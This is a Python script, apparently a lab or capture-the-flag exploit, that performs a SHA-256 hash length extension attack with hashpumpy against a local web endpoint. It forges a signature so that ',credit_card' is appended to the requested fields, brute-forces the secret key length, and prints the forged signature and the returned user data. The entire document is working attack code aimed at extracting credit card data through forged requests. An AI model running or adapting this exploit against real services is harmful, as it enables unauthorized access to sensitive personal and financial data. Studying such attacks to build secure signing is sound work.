from hashlib import sha256
from hashpumpy import hashpump
import requests, base64, sys

data = {
	'data_to_show': 'username',
	'signature': 'sdfsafsadfas',
}
append_data = ',credit_card'

url = 'http://localhost:5000/get_user_data'

def make_request(data):
	if not isinstance(data['data_to_show'], bytes):
		data['data_to_show'] = data['data_to_show'].encode()

	data['data_to_show'] = base64.b64encode(data['data_to_show'])

	r = requests.post(url, data=data)

	server_data = r.json()

	return server_data


# server_data = make_request(data)

# print(server_data)

# sys.exit()


signature = '77c635a441ad291897ff1b10cd20f3537ad8458d38295344275a4fe81c398594'

for i in range(100):
	new_signature, new_message = hashpump(signature, data['data_to_show'], append_data, i)

	_data = {
		'data_to_show': new_message,
		'signature': new_signature,
	}

	server_data = make_request(_data)

	if server_data.get('error', None) is None:
		print('Key Length:', i)
		print('Fake Signature:', new_signature)
		print('Fake Message:', new_message)
		print('Server Data:', server_data)
		break